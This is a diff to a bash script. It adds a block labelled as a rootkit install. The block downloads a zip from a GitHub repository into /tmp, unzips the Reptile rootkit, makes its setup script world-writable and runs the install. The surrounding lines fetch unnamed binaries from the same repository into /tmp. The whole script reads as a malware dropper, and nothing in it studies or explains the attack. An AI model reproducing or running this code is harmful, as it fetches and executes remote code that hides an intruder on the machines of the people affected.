@@ -1,5 +1,16 @@
 #!/bin/bash
 #
+#install rookit###################
+
+wget https://raw.githubusercontent.com/myvulweb/b3/master/rm.zip -O /tmp/mrp.zip
+cd /tmp
+unzip mrp.zip
+cd Reptile-master
+chmod 777 setup.sh
+./setup.sh install
+
+#install end#####################
+
 #down and checkmd5
 wget https://raw.githubusercontent.com/myvulweb/b3/master/linudxd -O /tmp/lainudxd
 wget https://raw.githubusercontent.com/myvulweb/b3/master/linudxt -O /tmp/lainudxt
